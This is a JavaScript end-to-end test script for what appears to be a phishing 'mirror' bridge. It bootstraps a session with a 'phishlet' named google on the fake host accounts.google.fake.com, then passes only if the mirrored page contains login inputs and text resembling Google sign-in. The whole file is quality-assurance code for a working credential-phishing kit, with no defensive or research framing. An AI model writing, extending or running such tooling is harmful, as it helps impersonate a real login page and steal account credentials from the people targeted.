/**
 * E2E: health → bootstrap → socket mirrorsnap with login input + styles.
 * node scripts/e2e-mirror-google.mjs
 */
import { io } from 'socket.io-client';

const BASE = process.env.MIRROR_BASE || 'http://127.0.0.1:1000';
const SESSION = `e2e-${Date.now()}`;
const TIMEOUT_MS = Number(process.env.MIRROR_E2E_TIMEOUT || 90000);

function fail(msg) {
  console.error('FAIL:', msg);
  process.exit(1);
}

async function main() {
  const health = await (await fetch(`${BASE}/health`)).json();
  console.log('health', health);
  if (!health.ok || health.mode !== 'mirror') fail('bridge not mirror');

  const boot = await fetch(
    `${BASE}/mirror/bootstrap?sessionKey=${encodeURIComponent(SESSION)}&phishHost=accounts.google.fake.com&phishletName=google`,
  );
  const html = await boot.text();
  if (!boot.ok || !html.includes('mirror-client.js')) fail('bootstrap bad');
  if (html.includes('mirror-skel') || html.includes('__SESSION_KEY__')) fail('bootstrap template broken');
  console.log('bootstrap ok', html.length);

  const socket = io(BASE, {
    path: '/socket.io',
    transports: ['polling'],
    upgrade: false,
    query: {
      sessionKey: SESSION,
      phishletName: 'google',
      phishHost: 'accounts.google.fake.com',
      vw: '1366',
      vh: '768',
    },
  });

  await new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error('socket timeout')), 15000);
    socket.on('connect', () => { clearTimeout(t); resolve(); });
    socket.on('connect_error', reject);
  });
  console.log('socket connected');

  const snap = await new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error(`no mirrorsnap in ${TIMEOUT_MS}ms`)), TIMEOUT_MS);
    socket.on('mirrorsnap', (d) => { clearTimeout(t); resolve(d); });
    socket.on('mirrorError', (e) => {
      clearTimeout(t);
      reject(new Error(e?.message || JSON.stringify(e)));
    });
  });

  const inner = String(snap?.rootInner || '');
  const head = String(snap?.head || '');
  console.log('snap', { inner: inner.length, head: head.length, hasInput: /<input/i.test(inner) });
  if (inner.length < 400) fail('rootInner too small');
  if (!/<input/i.test(inner)) fail('no input in snap');
  if (head.length < 100 && !/<style/i.test(head)) fail('no styles in head');
  if (!/email|identifier|sign in|password|phone|google/i.test(inner)) {
    fail('snap does not look like Google login');
  }

  socket.close();
  console.log('PASS e2e-mirror-google build=' + (health.build || ''));
  process.exit(0);
}

main().catch((e) => fail(e.message || e));
